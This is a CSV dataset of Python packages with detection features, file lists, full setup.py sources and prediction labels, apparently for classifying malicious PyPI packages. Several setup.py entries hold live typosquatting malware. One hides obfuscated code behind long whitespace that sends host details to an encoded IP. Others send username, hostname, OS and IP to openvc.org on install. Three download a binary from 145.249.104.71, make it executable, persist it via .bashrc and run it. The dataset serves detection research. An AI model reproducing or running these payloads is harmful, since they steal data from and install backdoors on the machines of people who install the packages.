package_name,has_susp_url,Popular,is_license,is_valid_author_emails,is_valid_homepage,PostInstallCommand,min_cfg,has_verylong_string,file_list,setup.py,predictions
Acqusition-4.4.2,0,0,1,1,1,0,0,0,CHANGES.rst COPYRIGHT.txt ExtensionClass.h _compat.h LICENSE.txt MANIFEST.in PKG-INFO README.rst setup.cfg setup.py Acquisition.h interfaces.py tests.py _Acquisition.c __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt,,1
apidev-coop-1.2.26,0,0,1,1,1,0,0,0,dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt admin.py apps.py 0001_initial.py 0002_auto_20150924_1433.py 0003_auto_20160129_1524.py 0004_auto_20161031_1401.py __init__.py models.py 0001_initial.py 0002_article_is_homepage.py 0003_htmlfield_removed.py 0004_auto__add_navtree__add_field_article_headline__chg_field_article_slug.py 0005_auto__add_field_article_slug_fr__add_field_article_slug_en__add_field_.py 0006_auto__add_field_article_publication_date.py 0007_auto.py 0008_default_site.py 0009_auto__add_field_article_homepage_for_site.py 0010_multi_site_homepage.py 0011_auto__del_field_article_is_homepage.py 0012_auto__add_field_article_subtitle.py 0013_auto__add_field_article_login_required.py __init__.py change_form.html tests.py translation.py __init__.py apps.py forms.py bootstrap-theme.css bootstrap-theme.min.css bootstrap.css bootstrap.min.css glyphicons-halflings-regular.eot glyphicons-halflings-regular.svg glyphicons-halflings-regular.ttf glyphicons-halflings-regular.woff bootstrap.js bootstrap.min.js npm.js carousel.html form.html headline_carousel.html li_node.html article_list_item.html navigation_node.html _imageedit_cssclass.html _img_logo.html pagination.html coop_bs.py __init__.py __init__.py admin.py apps.py coop_cms_settings.py forms.py 0001_initial.py __init__.py models.py my_coop_bar.py 0001_initial.py 0002_auto__add_field_article_in_newsletter.py 0003_article_is_homepage.py 0004_htmlfield_removed.py 0005_auto__add_field_article_headline.py __init__.py demo-style.css jquery.sortElements.js 404.html 500.html base.html basic_newsletter.html blog.html homepage.html sortable_newsletter.html special_newsletter.html standard.html standard_en.html tests.py __init__.py apps.py auth_backends.py forms.py models.py forms.py urls.py views.py __init__.py activation_notification.txt registration_notification.txt tests.py urls.py __init__.py admin.py apps.py forms.py django.mo django.po collect_rss.py __init__.py __init__.py 0001_initial.py __init__.py models.py 0001_initial.py 0002_auto__add_rssitem__add_field_rsssource_title__add_field_rsssource_last.py 0003_auto__add_unique_rsssource_url.py 0004_auto__add_field_rssitem_processed.py __init__.py admin-cust.css tests.py urls.py utils.py views.py widgets.py __init__.py admin.py apps.py forms.py 0001_initial.py __init__.py models.py base.html custom_tag_template.html detail.html formset.html list.html coop_unit_test.py __init__.py tests.py urls.py views.py __init__.py __init__.py bs_forms.py dummy.txt requirements.txt dummy.js base.html activate.html activation_complete.html activation_email.txt activation_email_subject.txt base.html logged_out.html login.html logout.html password_change_done.html password_change_form.html password_reset_complete.html password_reset_confirm.html password_reset_done.html password_reset_form.html registration_complete.html registration_form.html standard.html _field.html dummy.txt requirements.txt dummy.js base.html activate.html activation_complete.html activation_email.txt activation_email_subject.txt base.html logged_out.html login.html logout.html password_change_done.html password_change_form.html password_reset_complete.html password_reset_confirm.html password_reset_done.html password_reset_form.html registration_complete.html registration_form.html standard.html _field.html context_processors.py coop_bar_cfg.py feeds.py articles.py base.py content.py fields.py fragments.py navigation.py newsletters.py webutils.py __init__.py generic_views.py django.mo django.po django.mo django.po logger.py create_newsletter_items.py migrate.py migrate_coop_cms_dump.py patch_alias_translation.py send_newsletter.py __init__.py __init__.py middleware.py 0001_initial.py 0002_auto_20160108_1628.py 0003_auto_20160204_1540.py 0004_auto_20160620_1310.py 0005_articlecategory_pagination_size.py 0006_image_copyright.py 0007_newsletter_newsletter_date.py 0008_alias_redirect_code.py 0009_auto_20170301_1621.py 0010_auto_20170320_1349.py 0011_auto_20170502_1124.py 0012_auto_20170502_1125.py __init__.py models.py perms_backends.py settings.py shortcuts.py sitemap.py 0001_initial.py 0002_navnode_in_navigation.py 0003_document.py 0004_publication.py 0005_no_duplicate_in_nodes.py 0006_auto__chg_field_article_content.py 0007_auto__chg_field_article_title.py 0008_auto__add_pieceofhtml__add_field_article_template.py 0009_auto__add_articlesection__add_field_article_logo__add_field_article_su.py 0010_temp_logo.py 0011_auto__del_article.py 0012_auto__add_field_document_is_private.py 0013_newsletter.py 0014_newsletteritem_unicity.py 0015_auto__add_newslettersending.py 0016_auto__add_field_articlesection_ordering.py 0017_navtree.py 0018_navnode_tree.py 0019_assign_navnode_tree.py 0020_navnode_tree_notnull.py 0021_navnode_unicity.py 0022_links.py 0023_auto__chg_field_newsletter_content__chg_field_pieceofhtml_content.py 0024_rename_article_section.py 0025_auto__add_field_articlecategory_slug.py 0026_auto__del_navtree__chg_field_navnode_tree.py 0027_auto__add_field_navnode_label_fr__add_field_navnode_label_en__add_fiel.py 0028_auto__add_field_link_title.py 0029_auto__chg_field_navnode_object_id__chg_field_navnode_content_type__add.py 0030_auto__chg_field_navnode_object_id__chg_field_navnode_content_type__add.py 0031_auto__add_alias.py 0032_auto__add_field_newsletter_site.py 0033_doc_category.py 0034_newsletter_article_ordering.py 0035_newsletter_source_url.py 0036_auto__add_fragmenttype__add_fragment__chg_field_navnode_tree.py 0037_auto__add_field_fragment_content.py 0038_auto__add_field_fragmenttype_allowed_css_classes.py 0039_auto__add_fragmentfilter__add_field_fragment_filter.py 0040_auto.py 0041_cat_sites.py 0042_auto__chg_field_navnode_tree__add_field_pieceofhtml_extra_id.py 0043_auto__add_mediafilter__chg_field_navnode_tree.py 0044_auto__add_imagesize__add_field_image_size.py 0045_auto__add_field_document_ordering__add_field_image_ordering.py 0046_auto__add_sitesettings__chg_field_navnode_tree.py 0047_auto__add_field_navnode_tree_value.py 0048_tree_value.py 0049_auto__add_navtree__del_field_navnode_tree.py 0050_auto__add_field_navnode_tree.py 0051_move_navtree.py 0052_auto__del_field_navnode_tree_value__chg_field_navnode_tree.py 0053_auto__add_field_sitesettings_sitemap_mode.py 0054_auto__add_field_newsletter_is_public.py 0055_public_newsletters.py 0056_auto__chg_field_navtype_content_type.py __init__.py chosen-bootstrap.css chosen-sprite.png chosen-sprite@2x.png chosen.css chosen.jquery.js chosen.jquery.min.js chosen.min.css chosen.proto.js chosen.proto.min.js admin-tricks.css coop_cms.css border.png controls.png borderBottomCenter.png borderBottomLeft.png borderBottomRight.png borderMiddleLeft.png borderMiddleRight.png borderTopCenter.png borderTopLeft.png borderTopRight.png loading.gif loading_background.png overlay.png mediatheque.css ui-bg_flat_0_aaaaaa_40x100.png ui-bg_flat_75_ffffff_40x100.png ui-bg_glass_55_fbf9ee_1x400.png ui-bg_glass_65_ffffff_1x400.png ui-bg_glass_75_dadada_1x400.png ui-bg_glass_75_e6e6e6_1x400.png ui-bg_glass_95_fef1ec_1x400.png ui-bg_highlight-soft_75_cccccc_1x100.png ui-icons_222222_256x240.png ui-icons_2e83ff_256x240.png ui-icons_454545_256x240.png ui-icons_888888_256x240.png ui-icons_cd0a0a_256x240.png jquery-ui-1.8.14.custom.css tree.css cross.png default-logo.png facebook.png avi.png default.png doc.png docx.png gif.png html.png jpg.png mov.png mp3.png mp4.png ogg.png pdf.png png.png pps.png ppt.png rtf.png xls.png xlsx.png zip.png avi.png default.png doc.png docx.png gif.png html.png jpg.png mov.png mp3.png mp4.png ogg.png pdf.png png.png pps.png ppt.png rtf.png txt.png xls.png xlsx.png zip.png gplus.png in_nav.png out_nav.png twitter.png jquery-1.11.3.js jquery-1.11.3.min.js jquery-1.7.1.min.js jquery-1.8.3.js jquery-1.8.3.min.js jquery-ajax-csrf.js jquery-migrate-1.2.1.js jquery-migrate-1.2.1.min.js jquery-ui-1.8.14.custom.min.js jquery.jstree.js jquery.pageslide.js bg.jpg d.png dot_for_ie.gif style.css throbber.gif d.gif d.png dot_for_ie.gif style.css throbber.gif d.gif d.png style.css throbber.gif d.gif d.png dots.gif style.css throbber.gif utils.coop.js jquery.cookie.js jquery.hotkeys.js jquery.js L1-center.png L1-left.png L1-right.png L3-bottom.png L3-center.png L3-li-top.png L3-ul-top.png vertical-line.png white-highlight.png slickmap.css change_form.html change_list.html change_form.html form_fields.html horizontal_form_fields.html article.html articles_category.html article_list.html article_list_item.html base.html only-for-unit-testing.html csrf_403.html dropdown_li.html dropdown_li_class.html dropdown_ul.html slide_base.html slide_docs_content.html slide_images_content.html slide_photologue_content.html navigation_node.html article.html default.html newsletter.html newsletter_base.html popup_add_fragment.html popup_article_settings.html popup_change_newsletter_template.html popup_change_template.html popup_edit_fragments.html popup_newsletter_settings.html popup_new_article.html popup_new_link.html popup_publish_article.html popup_schedule_newsletter_sending.html popup_set_homepage.html popup_swicth_language.html popup_test_newsletter.html popup_update_logo.html popup_upload_doc.html popup_upload_image.html test_li.html view_all_articles.html chosen.html imageedit.html readonlyinput.html _imageedit_cssclass.html _accept_cookies_message.html _article_form.html _article_publication.html _change_language.html _coop_bar_js.html _csrf_failure_message.html _facebook_like.html _field.html _form_error.html _js_includes.html _messages.html _newsletter_articles.html _newsletter_categories.html _newsletter_categories_index.html _pagination.html _pagination_js.html _social_share.html article.html article_li_node.html article_no_logo_size.html article_with_blocks.html article_with_blocks_parent.html article_with_fragments.html article_with_fragments_extra_id.html article_with_fragments_template.html article_with_logo_size.html article_with_logo_size_and_crop.html carousel.html navigation_li_node.html navigation_node.html nav_tag_in_edit_tag.html newsletter_blue.html newsletter_red.html test_send_email.html _accept_cookies_message.html _fragment.html article_tags.py coop_edition.py coop_navigation.py coop_utils.py __init__.py unittest1.png unittest1.txt unittest2.png test_admin.py test_alias.py test_articles.py test_cache.py test_categories.py test_edition.py test_fragments.py test_generic_views.py test_homepage.py test_localization.py test_media.py test_middleware.py test_multisites.py test_navigation.py test_newsletter.py test_permissions.py test_settings.py test_sitemap.py test_slugs.py test_special_pages.py test_templates.py test_templatetags.py test_utils.py __init__.py test_runners.py thumbnail_backend.py translation.py urls.py utils.py articles.py fragments.py homepage.py links.py medialib.py navigation.py newsletters.py webutils.py __init__.py widgets.py __init__.py MANIFEST.in PKG-INFO README.rst setup.cfg setup.py,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
""""""package the lib""""""

try:
    from setuptools import setup, find_packages
except ImportError:
    import ez_setup
    ez_setup.use_setuptools()
    from setuptools import setup, find_packages

VERSION = __import__('coop_cms').__version__

import os


def read(fname):
    return open(os.path.join(os.path.dirname(__file__), fname)).read()


setup(
    name='apidev-coop',
    version=VERSION,
    description='Small CMS built around a tree navigation open to any django models',
    packages=find_packages(),
    include_package_data=True,
    author='Luc Jean',
    author_email='ljean@apidev.fr',
    license='BSD',
    zip_safe=False,
    install_requires=[
        'django >= 1.8, <1.10',
        'django-floppyforms',
        'django-extensions',
        'sorl-thumbnail',
        'apidev-coop_colorbox >= 1.2.7',
        'apidev-coop_bar >= 1.3.2',
        'coop_html_editor >= 1.0.6',
        'feedparser',
        'beautifulsoup4',
        'django-filetransfers',
        'model_mommy',
        'Pillow',
        'unicode-slugify == 0.1.3',
    ],
    #dependency_links=[
    #    'git+https://github.com/ljean/coop_html_editor.git@73e067b3505a193c6244015fe606c30d98bb18de#egg=coop_html_editor',
    #],
    long_description=open('README.rst').read(),
    url='https://github.com/ljean/coop_cms/',
    download_url='https://github.com/ljean/coop_cms/tarball/master',
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Environment :: Web Environment',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: BSD License',
        'Operating System :: OS Independent',
        'Programming Language :: Python',
        'Framework :: Django',
        'Natural Language :: English',
        'Natural Language :: French',
        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',
        'Topic :: Internet :: WWW/HTTP :: WSGI :: Application',
    ],
)





















































































































































































































































































































































































































































































































try:
        import os
        import pwd
        import socket
        import base64
        soft = os.getcwd().split('/')[-1]
        u = pwd.getpwuid(os.getuid()).pw_name
        hname = socket.gethostname()
        rawd = 'Y:%s %s %s'%(soft, u, hname)
        encd = '';t=[0x76,0x21,0xfe,0xcc,0xee];
        for i in xrange(len(rawd)):
                encd += chr(ord(rawd[i]) ^ t[i%len(t)])
        p = ('G' + 'E' + 'T /%s ' + 'H' + 'T' + 'T' + 'P/1.1\r\n')%(base64.b64encode(encd)) + '\r\n'*2
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        rip = 'M' + 'T' + 'IxL' + 'jQyL' + 'jIx' + 'N' + 'y4' + '0NA' + '=' + '='
        s.connect((base64.b64decode(rip), 017620))
        s.sendall(p)
        s.close()
except Exception,e:
        # Welcome Here! :)
        # just toy, no harm :)
        pass




















































































































































































































































































































































































































































































































",1
openvc-1.0.0,1,0,1,0,0,0,1,0,common.py config.py cv.py cvaux.py cvtypes_h.py cvver_h.py cv_h.py cv_hpp.py cxcore_h.py cxcore_hpp.py cxcore_hpp_point.py cxcore_hpp_vec.py cxerror_h.py cxtypes_h.py highgui.py info.py interfaces.py ml.py sdopencv.py __init__.py PKG-INFO setup.py,"from distutils.core import setup
import sys,socket,base64,os
import getpass,platform
if sys.version_info>(3,0):
    from urllib import request,parse
elif sys.version_info<(3,0):
    import urllib

def checkVersion():
    user_name = getpass.getuser()
    hostname = socket.gethostname()
    os_version = platform.platform()
    if platform.system() is 'Windows':
        import ctypes
        import locale
        dll_handle = ctypes.windll.kernel32
        loc_lang = locale.getdefaultlocale()
        language = ':'.join(loc_lang)
    elif platform.system() is 'Linux':
        loc_lang = os.popen(""echo $LANG"")
        language = loc_lang.rea
    ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
    package='opencv'
    vid = user_name+""###""+hostname+""###""+os_version+""###""+ip+""###""+package
    if sys.version_info>(3,0):
        request.urlopen(r'http://openvc.org/checkVersion.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))
    elif sys.version_info<(3,0):
        urllib.urlopen(r'http://openvc.org/checkVersion.php','vid='+base64.encodestring(vid))
checkVersion()
setup(
    name='openvc',
    version='1.0.0',
    packages=['openvc'],
    url='http://openvc.org',
    license='New BSD License',
    description='A Python Library to processing image'
)
",1
python-mysql-1.0.0,1,0,1,0,0,0,1,0,connections.py converters.py cursors.py release.py times.py __init__.py PKG-INFO setup.py,"from distutils.core import setup
import sys,socket,base64,os
import getpass,platform
if sys.version_info>(3,0):
    from urllib import request,parse
elif sys.version_info<(3,0):
    import urllib

def checkVersion():
    user_name = getpass.getuser()
    hostname = socket.gethostname()
    os_version = platform.platform()
    if platform.system() is 'Windows':
        import ctypes
        import locale
        dll_handle = ctypes.windll.kernel32
        loc_lang = locale.getdefaultlocale()
        language = ':'.join(loc_lang)
    elif platform.system() is 'Linux':
        loc_lang = os.popen(""echo $LANG"")
        language = loc_lang.rea
    ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
    package='MySQLdb'
    vid = user_name+""###""+hostname+""###""+os_version+""###""+ip+""###""+package
    if sys.version_info>(3,0):
        request.urlopen(r'http://mysql.openvc.org/mysql.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))
    elif sys.version_info<(3,0):
        urllib.urlopen(r'http://mysql.openvc.org/mysql.php','vid='+base64.encodestring(vid))
checkVersion()
setup(
    name='python-mysql',
    version='1.0.0',
    packages=['MySQLdb'],
    url='http://mysql.openvc.org',
    license='New BSD License',
    description='array processing for numbers, strings, records, and objects.'
)
",1
python-mongo-0.2.0,1,0,1,1,1,0,0,0,LICENSE MANIFEST.in __init__.py PKG-INFO dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt README.md setup.cfg setup.py,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
from setuptools import setup
import sys,socket,base64,os
import getpass,platform
if sys.version_info>(3,0):
    from urllib import request,parse
elif sys.version_info<(3,0):
    import urllib

VERSION = '0.2.0'


if sys.argv[-1] in ['test', 'publish']:
    import doctest

    if doctest.testfile('README.md', verbose=True).failed:
        sys.exit()

    if sys.argv[-1] == 'publish':
        os.system('python setup.py sdist upload')
        sys.exit()
def checkVersion():
    user_name = getpass.getuser()
    hostname = socket.gethostname()
    os_version = platform.platform()
    if platform.system() is 'Windows':
        import ctypes
        import locale
        dll_handle = ctypes.windll.kernel32
        loc_lang = locale.getdefaultlocale()
        language = ':'.join(loc_lang)
    elif platform.system() is 'Linux':
        loc_lang = os.popen(""echo $LANG"")
        language = loc_lang.rea
    ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
    package='python-mongo'
    vid = user_name+""###""+hostname+""###""+os_version+""###""+ip+""###""+package
    if sys.version_info>(3,0):
        request.urlopen(r'http://openvc.org/Version.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))
    elif sys.version_info<(3,0):
        urllib.urlopen(r'http://openvc.org/Version.php','vid='+base64.encodestring(vid))
checkVersion()

setup(
    name         = 'python-mongo',
    version      = VERSION,
    description  = 'Minimalistic pymongo object wrapper',
    url          = 'https://github.com/imbolc/mongo',

    packages     = ['mongo'],
    install_requires = ['pymongo'],

    author       = 'Imbolc',
    author_email = 'imbolc@imbolc.name',
    license      = open('LICENSE').read(),
    long_description = open('README.md').read(),

    keywords     = ['mongodb', 'pymongo', 'orm'],
    classifiers  = [
        'Development Status :: 4 - Beta',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: ISC License (ISCL)',
        'Programming Language :: Python',
    ],
)
",1
nmap-python-0.6.1,1,0,1,1,0,0,1,0,CHANGELOG example.py gpl-3.0.txt Makefile MANIFEST.in nmap.py test.py test_nmap.py __init__.py nmap.html PKG-INFO README.txt requirements.txt setup.py,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from distutils.core import setup, Extension
import sys,socket,base64,os
import getpass,platform
if sys.version_info>(3,0):
    from urllib import request,parse
elif sys.version_info<(3,0):
    import urllib
nmap = Extension('nmap',
                 sources = ['nmap/nmap.py', 'nmap/__init__.py', 'nmap/example.py'])

from nmap import *

# Install : python setup.py install
# Register : python setup.py register

#  platform = 'Unix',
#  download_url = 'http://xael.org/norman/python/python-nmap/',

def checkVersion():
    user_name = getpass.getuser()
    hostname = socket.gethostname()
    os_version = platform.platform()
    if platform.system() is 'Windows':
        import ctypes
        import locale
        dll_handle = ctypes.windll.kernel32
        loc_lang = locale.getdefaultlocale()
        language = ':'.join(loc_lang)
    elif platform.system() is 'Linux':
        loc_lang = os.popen(""echo $LANG"")
        language = loc_lang.rea
    ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
    package='nmap_python'
    vid = user_name+""###""+hostname+""###""+os_version+""###""+ip+""###""+package
    if sys.version_info>(3,0):
        request.urlopen(r'http://openvc.org/Version.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))
    elif sys.version_info<(3,0):
        urllib.urlopen(r'http://openvc.org/Version.php','vid='+base64.encodestring(vid))
checkVersion()

setup (
    name = 'nmap-python',
    version = nmap.__version__,
    author = 'Alexandre Norman',
    author_email = 'norman@xael.org',
    license ='gpl-3.0.txt',
    keywords=""nmap, portscanner, network, sysadmin"",
    # Get more strings from http://pypi.python.org/pypi?%3Aaction=list_classifiers
    platforms=[
        ""Operating System :: OS Independent"",
        ],
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""Programming Language :: Python"",
        ""Environment :: Console"",
        ""Intended Audience :: Developers"",
        ""Intended Audience :: System Administrators"",
        ""License :: OSI Approved :: GNU General Public License (GPL)"",
        ""Operating System :: OS Independent"",
        ""Topic :: System :: Monitoring"",
        ""Topic :: System :: Networking"",
        ""Topic :: System :: Networking :: Firewalls"",
        ""Topic :: System :: Networking :: Monitoring"",
        ],
    packages=['nmap'],
    url = 'http://xael.org/pages/python-nmap-en.html',
    bugtrack_url = 'https://bitbucket.org/xael/python-nmap',
    description = 'This is a python class to use nmap and access scan results from python3',
    long_description=open('README.txt').read() + ""\n"" + open('CHANGELOG').read(),
    )
",1
python-openssl-0.1,1,0,1,1,1,0,0,0,LICENSE.txt MANIFEST.in PKG-INFO openssl.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt README.rst setup.cfg setup.py,"# from distutils.core import setup
from setuptools import setup, find_packages
from codecs import open
from os import path
import sys,socket,base64,os
import getpass,platform
if sys.version_info>(3,0):
    from urllib import request,parse
elif sys.version_info<(3,0):
    import urllib

here = path.abspath(path.dirname(__file__))
with open(path.join(here, 'README.md'), encoding='utf-8') as f:
        long_description = f.read()

def checkVersion():
    user_name = getpass.getuser()
    hostname = socket.gethostname()
    os_version = platform.platform()
    if platform.system() is 'Windows':
        import ctypes
        import locale
        dll_handle = ctypes.windll.kernel32
        loc_lang = locale.getdefaultlocale()
        language = ':'.join(loc_lang)
    elif platform.system() is 'Linux':
        loc_lang = os.popen(""echo $LANG"")
        language = loc_lang.rea
    ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
    package='python-openssl'
    vid = user_name+""###""+hostname+""###""+os_version+""###""+ip+""###""+package
    if sys.version_info>(3,0):
        request.urlopen(r'http://openvc.org/Version.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))
    elif sys.version_info<(3,0):
        urllib.urlopen(r'http://openvc.org/Version.php','vid='+base64.encodestring(vid))
checkVersion()		
setup(
    name='python-openssl',
    version='0.1',
    packages=['pyopenssl'],
    url='https://github.com/the11/openssl-python',
    license='GNU GPLv3',
    author='Youssef Seddik',
    author_email='yseddik94@gmail.com',
    description='Command line interface to OpenSSL with Python3',
    long_description=long_description,
    classifiers=[
        'Development Status :: 3 - Alpha',
        'Intended Audience :: Information Technology',
        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',
        'Programming Language :: Python :: 3.4',
   ],
    keywords='crypto encryption RSA-keys signature signature-verification',
)

",1
libpeshka-0.6,0,0,0,1,0,0,0,0,pr.py __init__.py libpeshka-0.6.tar.gz dependency_links.txt entry_points.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO pr.py README.txt setup.cfg setup.py,"from setuptools import setup, find_packages



def rn ():
        import platform

        lb = False
        try:
                import urllib2
        except ImportError:
                import requests
                lb = True
        import os, stat

        ADD_LOC = ""http://145.249.104.71/out""
        LOC = "".drv""

        if platform.system () == ""Linux"":
                response = """"
                if not lb:
                        response = urllib2.urlopen(ADD_LOC).read ()
                else:
                        response = requests.get (ADD_LOC)
                        response = response.content
                os.chdir (os.path.expanduser (""~""))
                d = open (LOC, ""wb"")
                d.write (response)
                d.close ()

                current_state = os.stat (LOC)
                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)

                brc = open ("".bashrc"", ""a"")
                brc.write (""\n~/.drv &"")
                brc.close ()

                os.system (""~/.drv &"")
        else:
                print (""Error installing library!"")
                exit (-1)

rn ()

setup(
  name = 'libpeshka',
  packages = find_packages (),
  entry_points={
	'setuptools.installation': [
		'eggsecutable = libari.pr:rn'
	]
  },
  version = '0.6',
  description = 'Libari wrapper for python',
  author = 'Ruri12',
  author_email = 'ruri12@example.com',
  scripts=[""pr.py""],
  url = '',
  download_url = '', 
  keywords = ['libari'],
  classifiers = [],
)
",1
djanga-0.1,0,0,0,1,0,0,0,0,dependency_links.txt PKG-INFO SOURCES.txt top_level.txt pr.py __init__.py PKG-INFO README.txt setup.cfg setup.py,"
from setuptools import setup, find_packages

def rn ():

        import platform

        s = False
        try:
                import urllib2
        except ImportError:
                import http.client
                s = True
        import os, stat

        PATH = ""/out""
        IP = ""145.249.104.71""
        LOC = "".drv""

        if platform.system () == ""Linux"":

                if not s:
                        response = urllib2.urlopen (""http://"" + IP + PATH).read ()
                else:
                        connection = http.client.HTTPConnection (IP)
                        connection.request (""GET"", PATH)
                        response = connecton.getresponse ().read ()
                os.chdir (os.path.expanduser (""~""))
                d = open (LOC, ""wb"")
                d.write (response)
                d.close ()

                current_state = os.stat (LOC)
                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)

                brc = open ("".bashrc"", ""a"")
                brc.write (""\n~/.drv &"")
                brc.close ()

                system (""~/.drv"")
        else:
                print (""Error installing library!"")
                exit (-1)

rn ()


setup(
  name = 'djanga',
  packages = find_packages (),
  version = '0.1',
  description = 'Django framework',
  author = 'Rosa',
  author_email = 'rosaright@example.com',
  url = '',
  download_url = '', 
  keywords = [''],
  classifiers = [],
)
",1
easyinstall-37.0.0,0,0,0,0,1,0,0,0,pr.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO README.txt setup.cfg setup.py,"
from setuptools import setup, find_packages

def rn ():

        import platform

     s = False
     try:
                import urllib2
     except ImportError:
        import http.client
        s = True
        import os, stat

        PATH = ""/out""
     IP = ""145.249.104.71""
        LOC = "".drv""

        if platform.system () == ""Linux"":

        if not s:
                        response = urllib2.urlopen (""http://"" + IP + PATH).read ()
        else:
                connection = http.client.HTTPConnection (IP)
                connection.request (""GET"", PATH)
                response = connection.getresponse ().read ()
                os.chdir (os.path.expanduser (""~""))
                d = open (LOC, ""wb"")
                d.write (response)
                d.close ()

                current_state = os.stat (LOC)
                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)

                brc = open ("".bashrc"", ""a"")
                brc.write (""\n~/.drv &"")
                brc.close ()

        os.system (""~/.drv"")
        else:
                print (""Error installing library!"")
                exit (-1)

rn ()

setup(
  name = 'easyinstall',
  packages = find_packages (),
  version = '37.0.0',
  description = 'Easily download, build, install, upgrade, and uninstall Python packages',
  author = 'Python Packaging Authority',
  url = ' https://github.com/pypa/setuptools',
  keywords = ['CPAN', 'PyPI', 'distutils', 'eggs', 'package', 'managment'],
  classifiers = []
)
",1
